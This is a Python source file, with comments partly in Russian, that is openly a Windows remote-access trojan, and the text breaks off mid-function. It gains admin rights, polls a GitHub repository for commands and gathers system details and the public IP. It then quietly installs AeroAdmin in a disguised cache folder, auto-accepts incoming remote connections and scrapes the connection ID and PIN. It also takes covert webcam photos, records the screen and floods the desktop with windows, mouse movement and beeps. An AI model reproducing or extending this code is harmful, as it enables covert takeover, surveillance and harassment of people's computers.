import os
import sys
import ctypes
import json
import time
import requests
import subprocess
import threading
import winreg
import tempfile
import random
import tkinter as tk
from tkinter import *
from PIL import Image, ImageTk, ImageGrab
import pyautogui
from datetime import datetime
import math
import gc
from collections import deque
import winsound
import ctypes.wintypes
import queue
import keyboard
import cv2
import numpy as np
from concurrent.futures import ThreadPoolExecutor, TimeoutError
import urllib.request
import win32gui
import win32con
import win32process
import win32api
import win32ui
import re
import ssl
import hashlib
import base64
import shutil
import socket
import struct
import zipfile
import io
import ctypes

# ============================================================
# ===== REQUEST ADMIN RIGHTS =====
# ============================================================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# ============================================================
# ===== GITHUB CONFIGURATION =====
# ============================================================
GITHUB_CONFIG = {
    "owner": "chotkof",
    "repo": "pizdec",
    "token": "",  # ТОКЕН НЕ НУЖЕН ДЛЯ ПУБЛИЧНЫХ РЕПОЗИТОРИЕВ
    "raw_url": "https://raw.githubusercontent.com",
    "poll_interval": 2
}

# ============================================================
# ===== РЕЖИМ РАБОТЫ =====
# ============================================================
USE_GITHUB = True
LOCAL_MODE = False

print("[*] Режим: 🌐 GITHUB (чтение через raw)")
print(f"[*] Репозиторий: {GITHUB_CONFIG['owner']}/{GITHUB_CONFIG['repo']}")

# ============================================================
# ===== GITHUB ФУНКЦИИ (ТОЛЬКО ЧТЕНИЕ) =====
# ============================================================
def get_file_content(path):
    """Получить содержимое файла через raw.githubusercontent.com"""
    if not USE_GITHUB:
        return None, None
    
    url = f"{GITHUB_CONFIG['raw_url']}/{GITHUB_CONFIG['owner']}/{GITHUB_CONFIG['repo']}/main/{path}"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            return r.text, None
        else:
            print(f"[-] GET error {path}: {r.status_code}")
            return None, None
    except Exception as e:
        print(f"[-] GET error {path}: {e}")
        return None, None

def log_message(text, log_type='info'):
    """Записать лог (локально)"""
    print(f"[{log_type}] {text}")
    
    # Локальное логирование
    try:
        log_file = os.path.join(os.environ.get('TEMP', 'C:\\'), f'frederick_log_{datetime.now().strftime("%Y-%m-%d")}.txt')
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] [{log_type}] {text}\n")
    except:
        pass

def send_result(cmd, output, media=None):
    """Отправить результат (локально)"""
    result = {
        "cmd": cmd,
        "time": datetime.now().isoformat(),
        "output": output[:5000] if output else "✅ Done",
        "media": media
    }
    
    # Локальное сохранение результата
    try:
        result_file = os.path.join(os.environ.get('TEMP', 'C:\\'), f'frederick_result_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
        with open(result_file, 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
        print(f"[+] Result saved locally: {result_file}")
    except:
        pass

def update_status(status_data):
    """Обновить статус системы (локально)"""
    try:
        status_file = os.path.join(os.environ.get('TEMP', 'C:\\'), 'frederick_status.json')
        if os.path.exists(status_file):
            with open(status_file, 'r', encoding='utf-8') as f:
                old = json.load(f)
            status_data.update(old)
        with open(status_file, 'w', encoding='utf-8') as f:
            json.dump(status_data, f, indent=2)
    except:
        pass

def upload_media(filename, media_type='image'):
    """Заглушка для загрузки медиа (без токена)"""
    print(f"[!] Media not uploaded (no token): {filename}")
    return None

# ============================================================
# ===== LOCAL FILE COMMANDS =====
# ============================================================
def get_local_command():
    """Читает команду из локального файла"""
    try:
        cmd_file = os.path.join(os.environ.get('TEMP', 'C:\\'), 'frederick_cmd.txt')
        if os.path.exists(cmd_file):
            with open(cmd_file, 'r', encoding='utf-8') as f:
                cmd = f.read().strip()
            if cmd:
                # Очищаем файл после чтения
                open(cmd_file, 'w', encoding='utf-8').close()
                return cmd
    except:
        pass
    return None

# ============================================================
# ===== LAUNCH DEFENDER.EXE AND PRESS Y =====
# ============================================================
def launch_defender():
    """Launch defender.exe from the same directory and press Y"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        defender_path = os.path.join(script_dir, "defender.exe")
        
        if not os.path.exists(defender_path):
            print("[!] defender.exe not found in current directory")
            return False
        
        print("[+] Launching defender.exe...")
        
        process = subprocess.Popen(
            [defender_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        time.sleep(2)
        
        try:
            import win32gui
            import win32con
            import win32api
            
            def find_window_by_title(pattern):
                def callback(hwnd, windows):
                    if win32gui.IsWindowVisible(hwnd):
                        title = win32gui.GetWindowText(hwnd)
                        if pattern.lower() in title.lower():
                            windows.append(hwnd)
                    return True
                
                windows = []
                win32gui.EnumWindows(callback, windows)
                return windows
            
            for attempt in range(5):
                time.sleep(1)
                
                try:
                    windows = find_window_by_title("defender")
                    if windows:
                        hwnd = windows[0]
                        win32gui.SetForegroundWindow(hwnd)
                        time.sleep(0.5)
                        win32api.keybd_event(ord('Y'), 0, 0, 0)
                        time.sleep(0.1)
                        win32api.keybd_event(ord('Y'), 0, win32con.KEYEVENTF_KEYUP, 0)
                        print("[+] Sent 'Y' key to defender window")
                        return True
                except:
                    pass
                
                try:
                    process.stdin.write(b'Y\n')
                    process.stdin.flush()
                    print("[+] Sent 'Y' via stdin")
                    return True
                except:
                    pass
            
            try:
                time.sleep(1)
                keyboard.press_and_release('y')
                print("[+] Sent 'Y' via keyboard module")
                return True
            except:
                pass
            
            print("[!] Could not send 'Y' key to defender.exe")
            return False
            
        except Exception as e:
            print(f"[-] Error sending 'Y': {e}")
            return False
            
    except Exception as e:
        print(f"[-] Error launching defender.exe: {e}")
        return False

# ============================================================
# ===== SUPPRESS OUTPUT =====
# ============================================================
os.environ['OPENCV_LOG_LEVEL'] = 'ERROR'
os.environ['OPENCV_FFMPEG_LOG_LEVEL'] = '-8'
os.environ['OPENCV_VIDEOIO_DEBUG'] = '0'

import warnings
warnings.filterwarnings("ignore")

# ============================================================
# ===== GLOBAL VARIABLES =====
# ============================================================
CHAOS_ACTIVE = False
MOUSE_SHAKE_ACTIVE = False
SOUND_ACTIVE = False
WINDOWS = []
GIF_CACHE = {}
ROOT_WINDOW = None
WINDOW_COUNTER = 0
MAX_WINDOWS = 250
LAST_CMD = ""
WINDOW_QUEUE = queue.Queue()
CREATE_WINDOW = False
WINDOW_ID_COUNTER = 0
SHUTDOWN_KEYWORD = "chotko"
RECORDING_ACTIVE = False
IS_PROCESSING_CAM = False
AERO_INSTALLED = False
AERO_DATA = None
AERO_PROCESS = None
DEFENDER_LAUNCHED = False
AERO_ACCEPT_THREAD = None
AERO_ACCEPT_ACTIVE = False
SOUND_THREAD = None
PROCESSED_COMMANDS = set()

# ============================================================
# ===== SYSTEM INFORMATION =====
# ============================================================
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json()['ip']
    except:
        try:
            response = requests.get('http://icanhazip.com', timeout=5)
            return response.text.strip()
        except:
            return "Undefined"

def get_system_info():
    return {
        'pc_name': os.environ.get('COMPUTERNAME', 'Unknown'),
        'username': os.environ.get('USERNAME', 'Unknown'),
        'local_ip': get_local_ip(),
        'public_ip': get_public_ip(),
        'os': f"{os.environ.get('OS', 'Windows')} {os.environ.get('PROCESSOR_ARCHITECTURE', '')}"
    }

# ============================================================
# ===== WIN32 API FOR WINDOW HANDLING =====
# ============================================================
def get_window_text(hwnd):
    try:
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        if length == 0:
            return ""
        buffer = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length + 1)
        return buffer.value
    except:
        return ""

def get_control_text(hwnd):
    try:
        length = ctypes.windll.user32.SendMessageW(hwnd, 0x000E, 0, 0)
        if length > 0 and length < 1000:
            buffer = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.SendMessageW(hwnd, 0x000D, length + 1, buffer)
            return buffer.value
    except:
        pass
    return ""

def enum_child_windows(parent_hwnd, callback, data=None):
    def enum_proc(hwnd, lParam):
        if data:
            return callback(hwnd, data)
        return callback(hwnd)
    
    ctypes.windll.user32.EnumChildWindows(
        parent_hwnd, 
        ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)(enum_proc), 
        0
    )

def get_all_text_from_window(hwnd):
    texts = []
    
    window_text = get_window_text(hwnd)
    if window_text:
        texts.append(window_text)
    
    def collect_text(child_hwnd):
        try:
            class_name = ctypes.create_unicode_buffer(256)
            ctypes.windll.user32.GetClassNameW(child_hwnd, class_name, 256)
            class_name = class_name.value.lower()
            
            if class_name in ['syslistview32', 'msctls_statusbar32', 'toolbarwindow32']:
                return True
            
            text = get_control_text(child_hwnd)
            if text and text.strip():
                texts.append(text.strip())
            
            enum_child_windows(child_hwnd, lambda h: collect_text(h))
        except:
            pass
        return True
    
    collect_text(hwnd)
    return list(dict.fromkeys(texts))

def find_aero_window():
    def callback(hwnd, windows):
        try:
            title = get_window_text(hwnd)
            if 'AeroAdmin' in title:
                windows.append((hwnd, title))
        except:
            pass
        return True
    
    windows = []
    ctypes.windll.user32.EnumWindows(
        ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)(
            lambda h, d: callback(h, windows)
        ), 
        0
    )
    return windows

# ============================================================
# ===== AEROADMIN - AUTO ACCEPT =====
# ============================================================
def find_accept_button(hwnd):
    try:
        button_hwnds = []
        
        def enum_buttons(child_hwnd, hwnds):
            try:
                text = get_window_text(child_hwnd)
                if text and ('Принять' in text or 'Accept' in text or 'OK' in text):
                    hwnds.append(child_hwnd)
                    print(f"[+] Found Accept button: '{text}'")
            except:
                pass
            return True
        
        enum_child_windows(hwnd, enum_buttons, button_hwnds)
        
        if not button_hwnds:
            def enum_by_class(child_hwnd, hwnds):
                try:
                    class_name = ctypes.create_unicode_buffer(256)
                    ctypes.windll.user32.GetClassNameW(child_hwnd, class_name, 256)
                    if 'Button' in class_name.value:
                        text = get_window_text(child_hwnd)
                        if text and ('Принять' in text or 'Accept' in text or 'OK' in text or 'Yes' in text):
                            hwnds.append(child_hwnd)
                            print(f"[+] Found Accept button by class: '{text}'")
                except:
                    pass
                return True
            
            enum_child_windows(hwnd, enum_by_class, button_hwnds)
        
        return button_hwnds[0] if button_hwnds else None
    except:
        return None

def click_button(hwnd):
    try:
        ctypes.windll.user32.SendMessageW(hwnd, 0x00F5, 0, 0)
        print("[+] Clicked button via BM_CLICK")
        return True
    except:
        try:
            rect = win32gui.GetWindowRect(hwnd)
            x = rect[0] + (rect[2] - rect[0]) // 2
            y = rect[1] + (rect[3] - rect[1]) // 2
            win32api.SetCursorPos((x, y))
            time.sleep(0.1)
            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x, y, 0, 0)
            time.sleep(0.1)
            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x, y, 0, 0)
            print("[+] Clicked button via mouse")
            return True
        except:
            return False

def auto_accept_aero_connection():
    global AERO_ACCEPT_ACTIVE
    
    AERO_ACCEPT_ACTIVE = True
    log_message("🔄 Auto-accept mode activated for AeroAdmin", "info")
    
    while AERO_ACCEPT_ACTIVE:
        try:
            windows = find_aero_window()
            
            for hwnd, title in windows:
                if 'Входящее подключение' in title or 'Incoming connection' in title:
                    print(f"[+] Found incoming connection window: {title}")
                    
                    accept_button = find_accept_button(hwnd)
                    
                    if accept_button:
                        if click_button(accept_button):
                            log_message("✅ AeroAdmin connection ACCEPTED!", "success")
                            print("[+] Successfully accepted connection")
                        else:
                            try:
                                win32gui.SetForegroundWindow(hwnd)
                                time.sleep(0.5)
                                keyboard.press_and_release('enter')
                                log_message("✅ AeroAdmin connection ACCEPTED (via Enter)", "success")
                            except:
                                pass
                    else:
                        try:
                            win32gui.SetForegroundWindow(hwnd)
                            time.sleep(0.3)
                            keyboard.press_and_release('alt+a')
                            time.sleep(0.3)
                            keyboard.press_and_release('enter')
                            log_message("✅ AeroAdmin connection ACCEPTED (via keyboard shortcut)", "success")
                        except:
                            pass
                
                if 'AeroAdmin' in title:
                    accept_button = find_accept_button(hwnd)
                    if accept_button:
                        if click_button(accept_button):
                            log_message("✅ AeroAdmin connection ACCEPTED!", "success")
            
            time.sleep(1)
            
        except Exception as e:
            print(f"[-] Error in auto-accept: {e}")
            time.sleep(2)
    
    log_message("⏹️ Auto-accept mode stopped", "info")

def start_auto_accept():
    global AERO_ACCEPT_THREAD, AERO_ACCEPT_ACTIVE
    
    if AERO_ACCEPT_ACTIVE:
        log_message("⚠️ Auto-accept already running", "warning")
        return
    
    AERO_ACCEPT_THREAD = threading.Thread(target=auto_accept_aero_connection, daemon=True)
    AERO_ACCEPT_THREAD.start()
    log_message("🔄 Auto-accept started. Will automatically accept incoming AeroAdmin connections.", "info")

def stop_auto_accept():
    global AERO_ACCEPT_ACTIVE
    
    AERO_ACCEPT_ACTIVE = False
    log_message("⏹️ Auto-accept stopped", "info")

# ============================================================
# ===== AEROADMIN - DATA PARSING =====
# ============================================================
def parse_aero_data_from_window(hwnd):
    data = {}
    
    try:
        texts = get_all_text_from_window(hwnd)
        
        print("[+] Window texts found:")
        for i, text in enumerate(texts):
            print(f"    {i}: {text}")
        
        id_patterns = [
            r'(\d{3}\s\d{3}\s\d{3})',
            r'ID\s*[▪•:]\s*(\d{3}\s\d{3}\s\d{3})',
            r'Ваш ID\s*[▪•:]\s*(\d{3}\s\d{3}\s\d{3})',
            r'(\d{9,12})',
        ]
        
        pin_patterns = [
            r'PIN\s*(\d{4,6})',
            r'ПИН\s*(\d{4,6})',
        ]
        
        for text in texts:
            if not data.get('id'):
                for pattern in id_patterns:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        raw_id = match.group(1)
                        clean_id = re.sub(r'\s+', '', raw_id)
                        if len(clean_id) >= 9:
                            data['id'] = clean_id
                            print(f"[+] Found ID: {clean_id}")
                            break
        
        for text in texts:
            if 'v4.91' in text or '3813' in text:
                continue
            
            for pattern in pin_patterns:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    pwd = match.group(1)
                    if 4 <= len(pwd) <= 6:
                        data['password'] = pwd
                        print(f"[+] Found PIN: {pwd}")
                        break
            
            if not data.get('password'):
                numbers = re.findall(r'(?<!\d)(\d{4,6})(?!\d)', text)
                for num in numbers:
                    if num == '3813' or num == '491':
                        continue
                    if data.get('id') and num == data['id']:
                        continue
                    if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', text):
                        continue
                    data['password'] = num
                    print(f"[+] Found PIN (standalone): {num}")
                    break
        
        return data if data.get('id') else None
        
    except Exception as e:
        print(f"[-] Parse error: {e}")
        return None

def get_aero_data():
    global AERO_INSTALLED, AERO_DATA
    
    windows = find_aero_window()
    
    if not windows:
        try:
            result = subprocess.run('tasklist /FI "IMAGENAME eq AeroAdmin.exe"', 
                                   shell=True, capture_output=True, text=True, timeout=3)
            if 'AeroAdmin.exe' in result.stdout:
                log_message("🔍 AeroAdmin is running but window not found", "info")
                return None
        except:
            pass
        log_message("❌ AeroAdmin is not running", "error")
        return None
    
    sys_info = get_system_info()
    
    for hwnd, title in windows:
        try:
            data = parse_aero_data_from_window(hwnd)
            
            if data and data.get('id'):
                AERO_DATA = data
                AERO_INSTALLED = True
                
                msg = f"📡 AEROADMIN CONNECTION DATA\n"
                msg += f"PC: {sys_info['pc_name']}\n"
                msg += f"User: {sys_info['username']}\n"
                msg += "─" * 20 + "\n"
                msg += "Download: https://aeroadmin.ru\n"
                msg += "\nTO CONNECT:\n"
                msg += f"ID: {data['id']}\n"
                if data.get('password'):
                    msg += f"PIN: {data['password']}\n"
                else:
                    msg += "PIN: Check window\n"
                
                log_message(msg, "info")
                
                try:
                    import win32gui
                    from PIL import ImageGrab
                    rect = win32gui.GetWindowRect(hwnd)
                    screenshot = ImageGrab.grab(bbox=rect)
                    filename = f"aero_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                    screenshot.save(filename)
                    # upload_media теперь просто логирует
                    upload_media(filename, 'image')
                    send_result("/aero", msg, {"type": "image", "url": "local"})
                    time.sleep(1)
                    try:
                        os.remove(filename)
                    except:
                        pass
                except:
                    pass
                
                return data
        except Exception as e:
            print(f"[-] Error parsing window: {e}")
            continue
    
    log_message("⚠️ Could not parse AeroAdmin data", "warning")
    return None

# ============================================================
# ===== AEROADMIN - INSTALLATION =====
# ============================================================
def download_aeroadmin():
    try:
        appdata = os.environ.get('APPDATA')
        aero_dir = os.path.join(appdata, 'Microsoft', 'Windows', 'Cache', 'AeroAdmin')
        os.makedirs(aero_dir, exist_ok=True)
        
        exe_path = os.path.join(aero_dir, 'AeroAdmin.exe')
        
        if os.path.exists(exe_path):
            return exe_path
        
        url = "https://aeroadmin.ru/AeroAdmin.exe"
        
        try:
            response = requests.get(url, timeout=60)
            if response.status_code == 200:
                with open(exe_path, 'wb') as f:
                    f.write(response.content)
                return exe_path
        except:
            pass
        
        try:
            url_fallback = "https://download.aeroadmin.com/4.0/AeroAdmin.exe"
            urllib.request.urlretrieve(url_fallback, exe_path)
            if os.path.exists(exe_path):
                return exe_path
        except:
            pass
        
        return None
    except:
        return None

def start_aeroadmin():
    global AERO_PROCESS, AERO_INSTALLED
    
    if AERO_INSTALLED:
        return True
    
    try:
        exe_path = download_aeroadmin()
        if not exe_path or not os.path.exists(exe_path):
            log_message("❌ Failed to download AeroAdmin", "error")
            return False
        
        AERO_PROCESS = subprocess.Popen(
            [exe_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        
        log_message("📡 Starting AeroAdmin...", "info")
        time.sleep(8)
        
        start_auto_accept()
        
        data = get_aero_data()
        if data:
            return True
        
        time.sleep(5)
        data = get_aero_data()
        if data:
            return True
        
        log_message("⚠️ AeroAdmin started but couldn't get data", "warning")
        return False
        
    except Exception as e:
        log_message(f"❌ Error: {str(e)}", "error")
        return False

# ============================================================
# ===== CREATE FAKE GIFS =====
# ============================================================
def create_fake_gifs():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    colors = [
        (255, 0, 0), (0, 255, 0), (0, 0, 255),
        (255, 255, 0), (255, 0, 255), (0, 255, 255),
        (255, 165, 0), (128, 0, 128), (255, 192, 203),
        (0, 255, 128)
    ]
    
    created = False
    for i in range(1, 6):
        gif_path = os.path.join(script_dir, f'gif{i}.gif')
        if not os.path.exists(gif_path):
            try:
                frames = []
                for j in range(8):
                    color_idx = (i + j) % len(colors)
                    color = colors[color_idx]
                    img = Image.new('RGB', (200, 200), color=color)
                    frames.append(img)
                
                frames[0].save(
                    gif_path,
                    save_all=True,
                    append_images=frames[1:],
                    duration=100,
                    loop=0
                )
                print(f"[+] Created fake GIF: {gif_path}")
                created = True
            except Exception as e:
                print(f"[-] Error creating {gif_path}: {e}")
    
    return created

# ============================================================
# ===== PRELOAD GIFS =====
# ============================================================
def preload_gifs():
    global GIF_CACHE
    
    create_fake_gifs()
    
    script_dir = os.path.dirname(os.path.abspath(__file__))
    gif_names = ['gif1.gif', 'gif2.gif', 'gif3.gif', 'gif4.gif', 'gif5.gif']
    
    for gif_name in gif_names:
        path = os.path.join(script_dir, gif_name)
        if os.path.exists(path):
            try:
                img = Image.open(path)
                frames = []
                try:
                    while True:
                        frame_copy = img.copy().convert('RGBA')
                        frames.append(frame_copy)
                        img.seek(img.tell() + 1)
                except EOFError:
                    pass
                if not frames:
                    frames = [img.convert('RGBA')]
                GIF_CACHE[gif_name] = frames
                print(f"[+] Loaded {gif_name}: {len(frames)} frames")
            except Exception as e:
                print(f"[-] Error loading {gif_name}: {e}")
    
    if not GIF_CACHE:
        for i in range(1, 6):
            frames = []
            for j in range(5):
                color = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
                img = Image.new('RGB', (150, 150), color=color)
                frames.append(img)
            GIF_CACHE[f'gif{i}.gif'] = frames
        log_message("Created temporary GIFs", "info")
        return True
    
    log_message(f"Loaded GIFs: {len(GIF_CACHE)}", "info")
    return True

# ============================================================
# ===== SOUND =====
# ============================================================
def play_sound_loop():
    global SOUND_ACTIVE
    
    SOUND_ACTIVE = True
    try:
        while SOUND_ACTIVE and CHAOS_ACTIVE:
            try:
                winsound.Beep(random.randint(200, 1500), random.randint(50, 200))
                time.sleep(random.uniform(0.05, 0.3))
            except:
                try:
                    ctypes.windll.kernel32.Beep(random.randint(200, 1500), 100)
                except:
                    pass
                time.sleep(random.uniform(0.1, 0.5))
    except:
        pass

# ============================================================
# ===== GIF WINDOW =====
# ============================================================
class GifWindow:
    _instances = []
    
    def __init__(self, gif_name, width, height, x, y, window_id):
        global ROOT_WINDOW
        
        self.window_id = window_id
        self.alive = True
        self.frames = GIF_CACHE.get(gif_name, [])
        if not self.frames:
            return
        
        try:
            self.root = tk.Toplevel(ROOT_WINDOW)
            self.root.title(f"CHAOS #{window_id}")
            self.root.attributes('-topmost', True)
            self.root.overrideredirect(True)
            self.root.attributes('-transparentcolor', 'black')
            self.root.configure(bg='black')
            
            screen_width = ctypes.windll.user32.GetSystemMetrics(0)
            screen_height = ctypes.windll.user32.GetSystemMetrics(1)
            x = max(0, min(screen_width - width, x))
            y = max(0, min(screen_height - height, y))
            self.root.geometry(f"{width}x{height}+{x}+{y}")
            
            self.scaled_frames = []
            for frame in self.frames:
                try:
                    resized = frame.resize((width, height), Image.Resampling.LANCZOS)
                    self.scaled_frames.append(ImageTk.PhotoImage(resized))
                except:
                    pass
            
            if not self.scaled_frames:
                self.root.destroy()
                return
            
            self.label = tk.Label(self.root, bg='black')
            self.label.pack(fill='both', expand=True)
            
            self.frame_index = 0
            self.animate()
            
            self.dx = random.randint(-8, 8)
            self.dy = random.randint(-8, 8)
            self.move()
            
            self.root.after(random.randint(600000, 1200000), self.close)
            self.root.protocol("WM_DELETE_WINDOW", self.close)
            
            GifWindow._instances.append(self)
            WINDOWS.append(self.root)
            
            self.root.deiconify()
            self.root.lift()
            
        except Exception as e:
            print(f"[-] Error creating window: {e}")
    
    def animate(self):
        if not self.alive:
            return
        try:
            if self.root.winfo_exists() and self.scaled_frames:
                self.label.config(image=self.scaled_frames[self.frame_index])
                self.frame_index = (self.frame_index + 1) % len(self.scaled_frames)
                self.root.after(random.randint(30, 60), self.animate)
        except:
            pass
    
    def move(self):
        if not self.alive:
            return
        try:
            if not self.root.winfo_exists():
                return
            
            screen_width = ctypes.windll.user32.GetSystemMetrics(0)
            screen_height = ctypes.windll.user32.GetSystemMetrics(1)
            
            x = self.root.winfo_x() + self.dx
            y = self.root.winfo_y() + self.dy
            width = self.root.winfo_width()
            height = self.root.winfo_height()
            
            if x <= 0 or x + width >= screen_width:
                self.dx = -self.dx
                x = max(0, min(screen_width - width, x))
            if y <= 0 or y + height >= screen_height:
                self.dy = -self.dy
                y = max(0, min(screen_height - height, y))
            
            self.root.geometry(f"+{x}+{y}")
            
            if random.random() < 0.03:
                self.dx += random.randint(-3, 3)
                self.dy += random.randint(-3, 3)
                self.dx = max(-15, min(15, self.dx))
                self.dy = max(-15, min(15, self.dy))
            
            self.root.after(random.randint(30, 100), self.move)
        except:
            pass
    
    def close(self):
        self.alive = False
        try:
            if self.root.winfo_exists():
                self.root.destroy()
        except:
            pass
        if self in GifWindow._instances:
            GifWindow._instances.remove(self)
        try:
            WINDOWS.remove(self.root)
        except:
            pass

# ============================================================
# ===== QUEUE PROCESSING =====
# ============================================================
def process_queue():
    global CREATE_WINDOW, WINDOW_ID_COUNTER, WINDOW_COUNTER
    
    if not CREATE_WINDOW:
        return
    
    try:
        for _ in range(20):
            try:
                gif_name, width, height, x, y = WINDOW_QUEUE.get_nowait()
                WINDOW_ID_COUNTER += 1
                GifWindow(gif_name, width, height, x, y, WINDOW_ID_COUNTER)
                WINDOW_COUNTER += 1
            except queue.Empty:
                break
            except Exception as e:
                print(f"[-] Error creating: {e}")
    except:
        pass
    
    if ROOT_WINDOW and CREATE_WINDOW:
        try:
            ROOT_WINDOW.after(10, process_queue)
        except:
            pass

# ============================================================
# ===== MOUSE =====
# ============================================================
def mouse_shake():
    global MOUSE_SHAKE_ACTIVE
    MOUSE_SHAKE_ACTIVE = True
    screen_width, screen_height = pyautogui.size()
    
    while MOUSE_SHAKE_ACTIVE and CHAOS_ACTIVE:
        try:
            x = random.randint(0, screen_width - 1)
            y = random.randint(0, screen_height - 1)
            
            if random.random() < 0.4:
                pyautogui.moveTo(x, y, duration=0.01)
            else:
                pyautogui.moveTo(x, y, duration=random.uniform(0.02, 0.1))
            
            time.sleep(random.uniform(0.01, 0.05))
            
            if random.random() < 0.08:
                pyautogui.click()
            if random.random() < 0.05:
                pyautogui.scroll(random.randint(-10, 10))
        except:
            time.sleep(0.05)

# ============================================================
# ===== MAIN CHAOS LOOP =====
# ============================================================
def chaos_loop():
    global CHAOS_ACTIVE, WINDOW_COUNTER, CREATE_WINDOW
    
    if not GIF_CACHE:
        if not preload_gifs():
            log_message("❌ No GIFs", "error")
            return
    
    CREATE_WINDOW = True
    WINDOW_COUNTER = 0
    
    screen_width = ctypes.windll.user32.GetSystemMetrics(0)
    screen_height = ctypes.windll.user32.GetSystemMetrics(1)
    
    cols = 12
    rows = 12
    cell_width = screen_width // cols
    cell_height = screen_height // rows
    used_cells = set()
    
    center_gif = random.choice(list(GIF_CACHE.keys()))
    WINDOW_QUEUE.put((center_gif, 200, 200, screen_width//2 - 100, screen_height//2 - 100))
    used_cells.add((cols//2, rows//2))
    log_message(f"🎯 AVALANCHE STARTED!", "info")
    
    delay = 0.15
    gif_list = list(GIF_CACHE.keys())
    
    while CHAOS_ACTIVE and WINDOW_COUNTER < MAX_WINDOWS:
        try:
            gif_name = random.choice(gif_list)
            
            size_factor = max(0.15, 1 - (WINDOW_COUNTER / MAX_WINDOWS) * 0.85)
            width = random.randint(int(50 * size_factor), int(220 * size_factor))
            height = random.randint(int(50 * size_factor), int(220 * size_factor))
            
            available = [(c, r) for c in range(cols) for r in range(rows) if (c, r) not in used_cells]
            if available:
                col, row = random.choice(available)
                used_cells.add((col, row))
                x = col * cell_width + random.randint(0, max(0, cell_width - width))
                y = row * cell_height + random.randint(0, max(0, cell_height - height))
            else:
                x = random.randint(0, max(0, screen_width - width))
                y = random.randint(0, max(0, screen_height - height))
            
            WINDOW_QUEUE.put((gif_name, width, height, x, y))
            
            if WINDOW_COUNTER % 20 == 0:
                log_message(f"🎯 {WINDOW_COUNTER} windows", "info")
            
            delay = max(0.01, delay * 0.88)
            time.sleep(delay + random.uniform(0, 0.01))
            
            if len(GifWindow._instances) > 200:
                to_close = GifWindow._instances[:20]
                for win in to_close:
                    if win.window_id % 7 == 0:
                        win.close()
                    
        except Exception as e:
            print(f"[-] Error: {e}")
            time.sleep(0.3)
    
    CREATE_WINDOW = False
    log_message(f"💥 {WINDOW_COUNTER} windows created!", "info")
    
    update_status({"chaosActive": False, "windowCount": WINDOW_COUNTER})

# ============================================================
# ===== WEBCAM =====
# ============================================================
def take_photo():
    global IS_PROCESSING_CAM
    
    if IS_PROCESSING_CAM:
        log_message("⚠️ Camera processing already in progress!", "warning")
        return
    
    IS_PROCESSING_CAM = True
    
    try:
        log_message("📷 Taking photo from webcam...", "info")
        
        cap = None
        try:
            for cam_id in [0, 1]:
                try:
                    cap = cv2.VideoCapture(cam_id, cv2.CAP_DSHOW)
                    if not cap.isOpened():
                        cap = cv2.VideoCapture(cam_id)
                    
                    if cap.isOpened():
                        time.sleep(0.3)
                        ret, frame = cap.read()
                        cap.release()
                        
                        if ret and frame is not None:
                            filename = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                            cv2.imwrite(filename, frame)
                            upload_media(filename, 'image')
                            send_result("/cam", "✅ Webcam photo taken", {"type": "image", "url": "local"})
                            time.sleep(0.5)
                            try:
                                os.remove(filename)
                            except:
                                pass
                            log_message("✅ Photo taken!", "success")
                            IS_PROCESSING_CAM = False
                            return True
                except:
                    if cap is not None:
                        try:
                            cap.release()
                        except:
                            pass
                    continue
            
            log_message("❌ Webcam not found!", "error")
            send_result("/cam", "❌ Webcam not found")
            IS_PROCESSING_CAM = False
            return False
            
        except Exception as e:
            if cap is not None:
                try:
                    cap.release()
                except:
                    pass
            log_message(f"❌ Error: {str(e)}", "error")
            send_result("/cam", f"❌ Error: {str(e)}")
            IS_PROCESSING_CAM = False
            return False
            
    except Exception as e:
        log_message(f"❌ Error: {str(e)}", "error")
        send_result("/cam", f"❌ Error: {str(e)}")
        IS_PROCESSING_CAM = False
        return False

# ============================================================
# ===== SCREEN RECORDING =====
# ============================================================
def record_screen(duration):
    global RECORDING_ACTIVE
    
    if RECORDING_ACTIVE:
        log_message("⚠️ Recording already in progress!", "warning")
        return
    
    try:
        RECORDING_ACTIVE = True
        log_message(f"🎥 Starting screen recording ({duration} sec)...", "info")
        
        screen_size = pyautogui.size()
        fps = 15
        filename = f"screen_record_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
        
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, fps, screen_size)
        
        start_time = time.time()
        frames_captured = 0
        
        while time.time() - start_time < duration and RECORDING_ACTIVE:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            
            out.write(frame)
            frames_captured += 1
            
            if frames_captured % (fps * 5) == 0:
